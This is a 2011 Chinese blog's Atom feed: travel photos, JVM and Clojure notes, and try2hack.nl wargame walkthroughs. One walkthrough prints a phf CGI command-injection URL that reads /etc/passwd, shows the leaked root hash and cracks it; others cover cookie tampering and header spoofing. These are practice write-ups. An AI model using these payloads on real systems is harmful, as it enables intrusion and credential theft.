&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;&lt;a href=&quot;/uploads/2011/05/IMG_1400.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-167&quot; title=&quot;城隍庙&quot; src=&quot;/uploads/2011/05/IMG_1400.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;768&quot; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;南翔馒头店&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;&lt;a href=&quot;/uploads/2011/05/IMG_1406.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-168&quot; title=&quot;南翔馒头店&quot; src=&quot;/uploads/2011/05/IMG_1406.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;768&quot; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: left;&quot;&gt;&amp;nbsp;&lt;/p&gt;
&lt;p style=&quot;text-align: left;&quot;&gt;&lt;strong&gt;中午去了上海博物馆，下午去了外滩，很美很繁华，可惜相机没电了:(&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;七宝老街&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;&lt;a href=&quot;/uploads/2011/05/IMG_1430.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-169&quot; title=&quot;七宝老街&quot; src=&quot;/uploads/2011/05/IMG_1430.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;768&quot; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;天主教堂&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;&lt;a href=&quot;/uploads/2011/05/IMG_1421.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-170&quot; title=&quot;天主教堂&quot; src=&quot;/uploads/2011/05/IMG_1421.jpg&quot; alt=&quot;&quot; width=&quot;768&quot; height=&quot;1024&quot; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;浦东图书馆&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;&lt;a href=&quot;/uploads/2011/05/IMG_1464.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-171&quot; title=&quot;浦东图书馆&quot; src=&quot;/uploads/2011/05/IMG_1464.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;768&quot; /&gt;&lt;/a&gt;
&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>浙北安吉</title>
   <link href="http://hackfisher.github.com/blog/2011/05/north-of-zhejiang-anji"/>
   <updated>2011-05-31T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/05/north-of-zhejiang-anji</id>
   <content type="html">&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;中南百草园&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;/uploads/2011/05/Grass.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-158&quot; title=&quot;中南百草园&quot; src=&quot;/uploads/2011/05/Grass.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;681&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;/uploads/2011/05/DSC01603.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-159&quot; title=&quot;DSC01603&quot; src=&quot;/uploads/2011/05/DSC01603.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;681&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;鸟瞰&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;/uploads/2011/05/DSC01670.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-160&quot; title=&quot;鸟瞰&quot; src=&quot;/uploads/2011/05/DSC01670.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;681&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;竹子博物馆（龟甲竹）&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;/uploads/2011/05/IMG_1307.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-161&quot; title=&quot;竹子&quot; src=&quot;/uploads/2011/05/IMG_1307.jpg&quot; alt=&quot;&quot; width=&quot;768&quot; height=&quot;1024&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;熊猫&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;/uploads/2011/05/IMG_1338.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-162&quot; title=&quot;Pangda&quot; src=&quot;/uploads/2011/05/IMG_1338.jpg&quot; alt=&quot;&quot; width=&quot;614&quot; height=&quot;461&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;倒影&lt;/strong&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;/uploads/2011/05/water.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-163&quot; title=&quot;water&quot; src=&quot;/uploads/2011/05/water.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;577&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>32位和64位，以及跨平台的那点儿事</title>
   <link href="http://hackfisher.github.com/blog/2011/03/32bit-64bit-cross-platform"/>
   <updated>2011-03-11T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/03/32bit-64bit-cross-platform</id>
   <content type="html">64位的CPU可以跑 32位或者64位的OS

64位的OS可以跑32位或者64位的JVM

Java是跨平台的, 指得是Java编译成的class文件，可以在(32/64) .* (Oracle/IBM/...) .* (Linux/Win)等不同的JVM实现下面运行，Java源文件在不同的JVM下面不需要重新编译。但在不同的OS下面可能需要安装不同的JVM(这个程度上说，某个JVM实现不是跨平台的)。

怎么判断JVM是多少位的？

http://stackoverflow.com/questions/4574090/installed-jvm-is-64-bit-or-32-bit

怎么得到操作系统级别的信息?

http://stackoverflow.com/questions/4704073/how-can-i-get-system-hardware-info-via-java

http://stackoverflow.com/questions/25552/using-java-to-get-os-level-system-information

http://www.roseindia.net/java/beginners/OSInformation.shtml

http://nadeausoftware.com/articles/2008/03/java_tip_how_get_cpu_and_user_time_benchmarking

/com/fr/util/OperatingSystem.java

JNI，Java调用的本地库一般是用其他语言实现比如C等等，它们不是跨平台的，会遇到什么问题?

比如System.loadLibrary(&quot;FRElite4&quot;);在WIN下对应的是个DLL，在Linux下面是个.so/.a文件

再比如，Linux下面，32位下面编译的库，放到64位的JVM(不是OS?)中加载中会出现如下的错误，据说换成32bit的JVM就可以(这个需要测试一下)

http://www.linuxquestions.org/questions/linux-software-2/working-with-32-bit-jvm-on-64-system-sapgui-problem-654041/
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;java.lang.UnsatisfiedLinkError: /usr/lib/libFRElite4.so: /usr/lib/libFRElite4.so: wrong ELF class: ELFCLASS32 (Possible cause: architecture word width mismatch)
at java.lang.ClassLoader$NativeLibrary.load(Native Method)
at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1803)
at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1728)
at java.lang.Runtime.loadLibrary0(Runtime.java:823)
at java.lang.System.loadLibrary(System.java:1028)
at Sense4.Elite4.(Elite4.java:41)
at com.fr.base.core.FRCoreContext.getLockBytes(Unknown Source)
at com.fr.base.core.FRCoreContext.getBytes(Unknown Source)
at com.fr.web.ReportServlet.init(Unknown Source)&lt;/pre&gt;
飘忽不定的java.library.path，以及操作系统文件访问权限Java加载库文件，就是从System.getProperty(&quot;java.library.path&quot;)这个Path中寻找库的，但是这个默认属性值是由JVM确定的，其规律不太确定-Djava.library.path ..可以控制此属性，但是作为中间件，这个往往不能控制，需要Web服务器或者Resin提供设置，更何况很麻烦System.setProperty(&quot;java.library.path&quot;, &quot;usr/lib:lib&quot;);的做法虽然能动态改变属性值，但是测试过似乎库又不能正常加载。
操作系统文件访问权限这个问题很少遇到上次WIN在下，cache文件位置遇到过一次，这次加密所虽然没遇到过，不过很有可能还会遇到这个问题，作为一个应用程序，只是个Servlet，不是宿主进程，如何获得root权限，修改文件会遇到权限的很多限制。
怎么判断JVM是多少位的？

http://stackoverflow.com/questions/4574090/installed-jvm-is-64-bit-or-32-bit
怎么得到操作系统级别的信息?

http://stackoverflow.com/questions/4704073/how-can-i-get-system-hardware-info-viajava

http://stackoverflow.com/questions/25552/using-java-to-get-os-level-systeminformation

http://www.roseindia.net/java/beginners/OSInformation.shtml

http://nadeausoftware.com/articles/2008/03/java_tip_how_get_cpu_and_user_time_benchmarking
JNI，Java调用的本地库一般是用其他语言实现比如C等等，它们不是跨平台的，会遇到什么问题?比如System.loadLibrary(&quot;XXX&quot;);在WIN下对应的是个DLL，在Linux下面是个.so/.a文件再比如，Linux下面，32位下面编译的库，放到64位的JVM(不是OS?)中加载中会出现如下的错误，据说换成32bit的JVM就可以(这个需要测试一下)

http://www.linuxquestions.org/questions/linux-software-2/working-with-32-bit-jvm-on-64-system-sapgui-problem-654041/
java.lang.UnsatisfiedLinkError: /usr/lib/libXXX.so: /usr/lib/libXXX.so: wrong ELF class: ELFCLASS32 (Possible cause: architecture word width mismatch)

at java.lang.ClassLoader$NativeLibrary.load(Native Method)

at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1803)

at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1728)

at java.lang.Runtime.loadLibrary0(Runtime.java:823)

at java.lang.System.loadLibrary(System.java:1028)
</content>
 </entry>
 
 <entry>
   <title>(? (= Clojure (+ Lisp Java-Platform)))</title>
   <link href="http://hackfisher.github.com/blog/2011/03/clojure-lisp-java-platform"/>
   <updated>2011-03-03T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/03/clojure-lisp-java-platform</id>
   <content type="html">仅仅经过三年的时间，Java就这样开始有点被我厌恶了，因为我最近一直在寻找一些和Java不一样的东西。模块化，可扩展性，函数编程，并行计算等等。

一直听说这个世界上有两门古老但很神奇的语言，C和Lisp。自从开始接触SICP这本书，Lisp语言的强大特性吸引了我，尤其是那些抽象美的东西。Lisp是从数学发展而来，有数学这样一个无比坚固的基石，一点多余的东西都没有，可谓经典。学习一门语言的最好方式就是用它，能在工程中实用很重要，而不是只是用来学习和教授。尝试了一些Lisp的方言，Scheme, SBCL, CLisp等等，并非不实用，而是太小众了，只在某些专业领域用的人比较多，究其原因，是其他领域的库和工具太少了。并非不可以做，而是人太少了，构建一个齐全的平台库支持和好用的辅助工具需要花费很多的时间。就拿Clisp来说，我在Windows下面找一个十分好用的IDE都稍微有些困难，资料也少。没办法，是个美人，无人识。

这样好的一门语言，如果因为没有了平台库的支持就放弃使用就太可惜了。可是，这个世界上总会有一部分人追求美好但又务实，愿意为了美好而稍作妥协，&lt;a href=&quot;http://clojure.org/&quot; target=&quot;_blank&quot;&gt;Clojure&lt;/a&gt;就是这样一个Lisp Dialect，虽然才经过简单的了解，但是Clojure点燃了我对Lisp的希望，通过借力，它将Lisp这个理想和Java平台这个现实结合的似乎很好，这也许得益于Java所留的后招，即(!=  JVM  Java语言)这一设计，才能做到四两拨千斤。也许正是因为这一点，这门语言潜力无限......
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;strong&gt; &lt;/strong&gt;

&lt;strong&gt; &lt;/strong&gt;
&lt;pre escaped=&quot;true&quot; lang=&quot;lisp&quot; line=&quot;1&quot;&gt;(= Clojure (+ Lisp Java-Platform))&lt;/pre&gt;
&lt;strong&gt; &lt;/strong&gt;

&lt;strong&gt; &lt;/strong&gt;

参考资料：
[1]JavaEye上面有一个关于Clojure的很好的Demo，对与那些正在Java平台上痛苦的程序员来说，是个很好的宣传资料：&lt;a href=&quot;http://www.javaeye.com/topic/713259&quot; target=&quot;_blank&quot;&gt;几行代码解决淘宝面试题 之Clojure版&lt;/a&gt;。
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】Try2hack.nl第八关——phf漏洞和破解Linux密码</title>
   <link href="http://hackfisher.github.com/blog/2011/03/try2hack_nl-8th"/>
   <updated>2011-03-01T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/03/try2hack_nl-8th</id>
   <content type="html">第八关地址：

&lt;a href=&quot;http://www.try2hack.nl/levels/level8-balnrg.xhtml&quot;&gt;http://www.try2hack.nl/levels/level8-balnrg.xhtml&lt;/a&gt;

a. 打开页面，可以看到是让你输入用户名和密码。检查html，javascript和报头，没有什么特殊的地方。

b. 随便输入一个用户名密码，可以看到会跳转到下面这个地址，显示“Sorry, the login information could not be verified.”
&lt;pre escaped=&quot;true&quot; lang=&quot;url&quot; line=&quot;1&quot;&gt;http://www.try2hack.nl/cgi-bin/phf&lt;/pre&gt;
c. 看到结尾的phf有点奇怪，上网搜一下，发现有一个&lt;a href=&quot;http://insecure.org/sploits/phf-cgi.html&quot;&gt;漏洞&lt;/a&gt;与这个有关系，机会来了，按照描述，输入下面的url
&lt;pre escaped=&quot;true&quot; lang=&quot;url&quot; line=&quot;1&quot;&gt;http://www.try2hack.nl/cgi-bin/phf?Qalias=x%0A/bin/cat%20/etc/passwd&lt;/pre&gt;
d. 浏览器返回内容，看起来有点熟悉，结合url的格式，发现这个不是linux系统下的&lt;a href=&quot;http://flash7783.javaeye.com/blog/583792&quot;&gt;/etc/passwd&lt;/a&gt;文件吗，上面的访问相当于执行了如下命令
&lt;pre escaped=&quot;true&quot; lang=&quot;bash&quot; line=&quot;1&quot;&gt;/bin/cat /etc/passwd&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot; lang=&quot;txt&quot; line=&quot;1&quot;&gt;root:khXGN7s.ldaJI:0:0::0:0:Charlie &amp;amp;:/root:/usr/local/bin/bash
daemon:*:1:1::0:0:Owner of many system processes:/root:/sbin/nologin
operator:*:2:5::0:0:System Operator:/:/sbin/nologin
bin:*:3:7::0:0:Binaries Commands and Source:/:/sbin/nologin
tty:*:4:65533::0:0:Tty Sandbox:/:/sbin/nologin
kmem:*:5:65533::0:0:KMem Sandbox:/:/sbin/nologin
games:*:7:13::0:0:Games pseudo-user:/usr/games:/sbin/nologin
news:*:8:8::0:0:News Subsystem:/:/sbin/nologin
man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/sbin/nologin
sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/sbin/nologin
smmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/sbin/nologin
mailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/sbin/nologin
bind:*:53:53::0:0:Bind Sandbox:/:/sbin/nologin
uucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucico
xten:*:67:67::0:0:X-10 daemon:/usr/local/xten:/sbin/nologin
pop:*:68:6::0:0:Post Office Owner:/nonexistent:/sbin/nologin
www:*:80:80::0:0:World Wide Web Owner:/nonexistent:/sbin/nologin
nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/sbin/nologin
root:khXGN7s.ldaJI:0:0::0:0:Charlie &amp;amp;:/root:/usr/local/bin/bashdaemon:*:1:1::0:0:Owner of many system processes:/root:/sbin/nologinoperator:*:2:5::0:0:System Operator:/:/sbin/nologinbin:*:3:7::0:0:Binaries Commands and Source:/:/sbin/nologintty:*:4:65533::0:0:Tty Sandbox:/:/sbin/nologinkmem:*:5:65533::0:0:KMem Sandbox:/:/sbin/nologingames:*:7:13::0:0:Games pseudo-user:/usr/games:/sbin/nologinnews:*:8:8::0:0:News Subsystem:/:/sbin/nologinman:*:9:9::0:0:Mister Man Pages:/usr/share/man:/sbin/nologinsshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/sbin/nologinsmmsp:*:25:25::0:0:Sendmail Submission User:/var/spool/clientmqueue:/sbin/nologinmailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/sbin/nologinbind:*:53:53::0:0:Bind Sandbox:/:/sbin/nologinuucp:*:66:66::0:0:UUCP pseudo-user:/var/spool/uucppublic:/usr/libexec/uucp/uucicoxten:*:67:67::0:0:X-10 daemon:/usr/local/xten:/sbin/nologinpop:*:68:6::0:0:Post Office Owner:/nonexistent:/sbin/nologinwww:*:80:80::0:0:World Wide Web Owner:/nonexistent:/sbin/nologinnobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/sbin/nologin&lt;/pre&gt;
e. 最终的答案会不会与这个有关系呢，其他行都没什么特殊，只有第一行比较特殊，而且密码没有进行Shadow安全密码服务。我们用经典的&lt;a href=&quot;http://www.openwall.com/john/&quot;&gt;John The Ripper Password Cracker&lt;/a&gt;来解决这个问题，得到密码arse。

f. 输入用户名密码，拿到&lt;a href=&quot;http://www.try2hack.nl/levels/level9-gnapei.xhtml&quot;&gt;下一关&lt;/a&gt;的入场劵。
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】Try2hack.nl第九关——修改Cookies</title>
   <link href="http://hackfisher.github.com/blog/2011/03/try2hack-9th"/>
   <updated>2011-03-01T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/03/try2hack-9th</id>
   <content type="html">第九关地址：

http://www.try2hack.nl/levels/level9-gnapei.xhtml

a. 打开也面，提示登录，随机输入用户名密码，Enter后发现还是停留在这个页面。

b. 检查HTML源代码，响应头信息，发现有Set-Cookies.
&lt;pre escaped=&quot;true&quot; lang=&quot;txt&quot; line=&quot;1&quot;&gt;Content-Encoding	gzip
Vary	Accept-Encoding
X-Powered-By	PHP/5.3.3
Set-Cookie	str_username=admin str_password=yu0aertehbomb auth=no
Content-Type	text/html
Content-Length	1614
Date	Tue, 01 Mar 2011 14:58:22 GMT
Server	LiteSpeed
Connection	Keep-Alive
Keep-Alive	timeout=5, max=100&lt;/pre&gt;
&lt;div&gt;c. 猜测用户名和密码分别是admin和yu0aertehbomb，登录提示没有auth，想到cookies里面还有个auth的key，于是想到到了修改cookies。&lt;/div&gt;
&lt;div&gt;可以在firebug中的获取附加组件中搜索&quot;cookies&quot;，可以找到很多修改cookies的插件，选择安装一个，比如&lt;a href=&quot;http://addneditcookies.mozdev.org/&quot;&gt;Add &amp;amp; Edit Cookies&lt;/a&gt;。&lt;/div&gt;
d. 搜索try2hack.nl，将cookies中的auth值改为yes，重新登录，得到第10关的入口：

&lt;em&gt;Good job! You can find Level 10 at our IRC channels. Go to #try2hack.level10 on irc.efnet.org and use 'yu0aertehbomb' as key to continue. See the &lt;a href=&quot;http://www.try2hack.nl/chat/&quot;&gt;chat&lt;/a&gt; page for more information.&lt;/em&gt;

&lt;em&gt;http://www.try2hack.nl/chat/&lt;/em&gt;
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】Try2hack.nl第七关</title>
   <link href="http://hackfisher.github.com/blog/2011/02/try2hack_nl-7th"/>
   <updated>2011-02-28T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/try2hack_nl-7th</id>
   <content type="html">第七关地址：

&lt;a href=&quot;http://www.try2hack.nl/levels/level7-xfkohc.php&quot;&gt;http://www.try2hack.nl/levels/level7-xfkohc.php&lt;/a&gt;

a. 打开页面，提示说必须要用IE 7.66登录，于是下了一个IE Tester访问，还是不行，必须是要这个版本的。

b. 于是想到了重写访问报头(HTTP-HEADER)的user-agent，改成MSIE 7.66，又提示需要用Linux系统访问，照例在user-agent加上Linux

c. 最后，还需要加上Referer为http://www.microsoft.com/ms.htm，也加上，这些都很简单，修改后，可以看到第八关的入口。

d. 下面我们用Lisp语言来实现之，首先安装&lt;a href=&quot;http://sourceforge.net/projects/clisp/&quot;&gt;clisp&lt;/a&gt;。找到一本书学习一下，比如&lt;a href=&quot;http://landoflisp.com/&quot;&gt;Land of Lisp&lt;/a&gt;。

&lt;a href=&quot;/uploads/2011/02/land_of_lisp.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-124&quot; title=&quot;land_of_lisp&quot; src=&quot;/uploads/2011/02/land_of_lisp.jpg&quot; alt=&quot;&quot; width=&quot;315&quot; height=&quot;420&quot; /&gt;&lt;/a&gt;e. 下载安装并学会使用Lisp的一个库管理器&lt;a href=&quot;http://www.quicklisp.org/&quot;&gt;Quicklisp&lt;/a&gt;。
&lt;pre escaped=&quot;true&quot; lang=&quot;lisp&quot; line=&quot;1&quot;&gt;(quicklisp-quickstart:install)&lt;/pre&gt;
f. google 搜索 lisp http client，找到&lt;a href=&quot;http://weitz.de/drakma/&quot;&gt;drakma&lt;/a&gt;。在quicklisp中搜索并安装drakma.
&lt;pre escaped=&quot;true&quot; lang=&quot;lisp&quot; line=&quot;1&quot;&gt;(ql:system-apropos &quot;drakma&quot;)
(ql:quickload &quot;drakma&quot;)&lt;/pre&gt;
&lt;div&gt;g. 在安装过程中可能会弹出找不到openssl的DLL外部库的信息，所有的库可以在&lt;a href=&quot;http://gnuwin32.sourceforge.net/packages/openssl.htm&quot;&gt;这里&lt;/a&gt;找到。&lt;/div&gt;
h. 最终，使用drakma的http-request访问第七关的网址，输出返回的信息保存为html，用浏览器打开，得到&lt;a href=&quot;http://www.try2hack.nl/levels/level8-balnrg.xhtml&quot;&gt;第八关的地址&lt;/a&gt;。
&lt;pre escaped=&quot;true&quot; lang=&quot;lisp&quot; line=&quot;1&quot;&gt;(http-request &quot;http://www.try2hack.nl/levels/level7-xfkohc.php&quot;
:user-agent &quot;Mozilla/4.0 (compatible;MSIE 7.66;Linux)\\r\\n&quot;
:additional-headers '((Referer . &quot;http://www.microsoft.com/ms.htm&quot;))
)&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>doubanclaimcbd55902b8d99113</title>
   <link href="http://hackfisher.github.com/blog/2011/02/doubanclaimcbd55902b8d99113"/>
   <updated>2011-02-16T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/doubanclaimcbd55902b8d99113</id>
   <content type="html">豆瓣验证
doubanclaim202ffef0a9699bae
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】Try2hack.nl第三关</title>
   <link href="http://hackfisher.github.com/blog/2011/02/try2hack_nl-third"/>
   <updated>2011-02-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/try2hack_nl-third</id>
   <content type="html">第三关地址：&lt;a href=&quot;http://www.try2hack.nl/levels/level3-.xhtml&quot;&gt;http://www.try2hack.nl/levels/level3-.xhtml&lt;/a&gt;

a. 刚打开网站，浏览器弹出如下一个对话框，如果点确定或者取消，就会立即跳转到另外一个网页，导致无法用Chrome的开发人员工具或者firebug查看源代码。

&lt;a href=&quot;/uploads/2011/02/level3_prompt.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-91&quot; title=&quot;level3_prompt&quot; src=&quot;/uploads/2011/02/level3_prompt.png&quot; alt=&quot;&quot; width=&quot;356&quot; height=&quot;132&quot; /&gt;&lt;/a&gt;

b. 其实不一定要在浏览器里面查看源代码，自己写个程序到那个地址读出来就是。
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URL;
public class Main {
/**
* @param args
*/
public static void main(String[] args) throws Exception {
String htmlContent = readResourceAsString((new URL(&quot;http://www.try2hack.nl/levels/level3-.xhtml&quot;)).openStream(), &quot;utf-8&quot;);
System.out.println(htmlContent);
}
public static String readResourceAsString(InputStream in, String encode) {
StringBuffer sb = new StringBuffer();
String line = null;
if (in != null) {
try {
java.io.BufferedReader br = new BufferedReader(
new java.io.InputStreamReader(in, encode));
while ((line = br.readLine()) != null) {
// 换行
if (sb.length() &amp;gt; 0) {
sb.append('\n');
}
sb.append(line);
}
} catch (UnsupportedEncodingException e) {
e.printStackTrace();
} catch (IOException e) {
e.printStackTrace();
}
}
return sb.toString();
}
}
import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.UnsupportedEncodingException;import java.net.URL;

public class Main {
/**	 * @param args	 */	public static void main(String[] args) throws Exception {	 String htmlContent = readResourceAsString((new URL(&quot;http://www.try2hack.nl/levels/level3-.xhtml&quot;)).openStream(), &quot;utf-8&quot;);	 System.out.println(htmlContent);	}	 public static String readResourceAsString(InputStream in, String encode) {	 StringBuffer sb = new StringBuffer();	 String line = null;	 if (in != null) {	 try { java.io.BufferedReader br = new BufferedReader(	 new java.io.InputStreamReader(in, encode));	 while ((line = br.readLine()) != null) { // 换行	 if (sb.length() &amp;gt; 0) {	 sb.append('\n');	 }	 sb.append(line);	 }	 } catch (UnsupportedEncodingException e) {	 e.printStackTrace();	 } catch (IOException e) {	 e.printStackTrace();	 }	 }
return sb.toString();	}
}&lt;/pre&gt;
c. 运行这个Java程序，然后得到输出的HTML，注意输出中的脚本逻辑具有迷惑性：
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;&amp;lt;script type=&quot;text/javascript&quot; src=&quot;JavaScript&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
      &amp;lt;!--
      pwd = prompt(&quot;Please enter the password for level 3:&quot;,&quot;&quot;);
      if (pwd==PASSWORD){
        alert(&quot;Allright!\nEntering Level 4 ...&quot;);
        location.href = CORRECTSITE;
      }
      else {
        alert(&quot;WRONG!\nBack to disneyland !!!&quot;);
        location.href = WRONGSITE;
      }
      PASSWORD=&quot;AbCdE&quot;;
      CORRECTSITE=&quot;level4-sfvfxc.xhtml&quot;;
      WRONGSITE=&quot;http://www.disney.com&quot;;
      //--&amp;gt;
    &amp;lt;/script&amp;gt;&lt;/pre&gt;
d. 你可能意味密码就是&quot;AbCdE&quot;，但是错了，这是为了误导里的，真正的密码在这个文件里面：
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;http://www.try2hack.nl/levels/JavaScript&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>【趣味Hack】Try2hack.nl第五关和第六关</title>
   <link href="http://hackfisher.github.com/blog/2011/02/try2hack_nl-5th-6th"/>
   <updated>2011-02-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/02/try2hack_nl-5th-6th</id>
   <content type="html">&lt;strong&gt;第五关&lt;/strong&gt;地址：

http://www.try2hack.nl/levels/level5-fdvbdf.xhtml

a. 提示下载一个Visual Basic 3.0程序，运行之提示输入用户名密码。

b. 先尝试反编译之，vb3的程序似乎比vb5, vb6好反编译一些，找到一个好用的反编译软件Dodi，&lt;a href=&quot;http://download.csdn.net/down/3011468/zjx20&quot; target=&quot;_blank&quot;&gt;下载地址&lt;/a&gt;。反编译LEVEL5.EXE，得到LEVEL5.BAS代码
&lt;pre escaped=&quot;true&quot; lang=&quot;vb&quot; line=&quot;1&quot;&gt;' LEVEL5.FRM
Option Explicit
Sub cmdLogin_Click ()
If  edtUsername = Mid(gc0006, 56, 1) &amp;amp; Mid(gc0006, 28, 1) &amp;amp; Mid(gc0006, 35, 1) &amp;amp; Mid(gc0006, 3, 1) &amp;amp; Mid(gc0006, 44, 1) &amp;amp; Mid(gc0006, 11, 1) &amp;amp; Mid(gc0006, 13, 1) &amp;amp; Mid(gc0006, 21, 1) Then
If  edtPassword = Mid(gc0006, 45, 1) &amp;amp; Mid(gc0006, 48, 1) &amp;amp; Mid(gc0006, 25, 1) &amp;amp; Mid(gc0006, 32, 1) &amp;amp; Mid(gc0006, 15, 1) &amp;amp; Mid(gc0006, 40, 1) &amp;amp; Mid(gc0006, 25, 1) &amp;amp; Mid(gc0006, 14, 1) &amp;amp; Mid(gc0006, 19, 1) Then
MsgBox &quot;Level 6 can be found at: &quot; &amp;amp; Left$(gc000A, 37) &amp;amp; Mid(gc0006, 21, 1) &amp;amp; Mid(gc0006, 14, 1) &amp;amp; Mid(gc0006, 29, 1) &amp;amp; Mid(gc0006, 32, 1) &amp;amp; Mid(gc0006, 12, 1) &amp;amp; Mid(gc0006, 14, 1) &amp;amp; Mid(gc000A, 44, 6), 0, &quot;Horray!&quot;
End
End If
End If
MsgBox &quot;Invalid username and/or password!&quot;, 0, &quot;ERROR!&quot;
End Sub
Sub Form_Load ()
Me.Move (Screen.Width - Me.Width) / 2, (Screen.Height - Me.Height) / 2
End Su
' LEVEL5.FRMOption Explicit
